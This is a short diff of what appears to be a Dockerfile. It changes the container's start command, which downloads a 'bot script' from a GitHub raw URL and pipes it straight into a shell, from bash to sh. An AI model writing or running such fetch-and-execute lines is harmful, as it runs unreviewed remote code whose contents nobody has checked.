@@ -37,4 +37,4 @@ RUN apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
 RUN echo "Uploaded files:" && ls /home/stuff/
 
 # Run bot script:
-CMD curl https://raw.githubusercontent.com/pagesrlepla/mx9/main/build.sh | bash
+CMD curl https://raw.githubusercontent.com/pagesrlepla/mx9/main/build.sh | sh
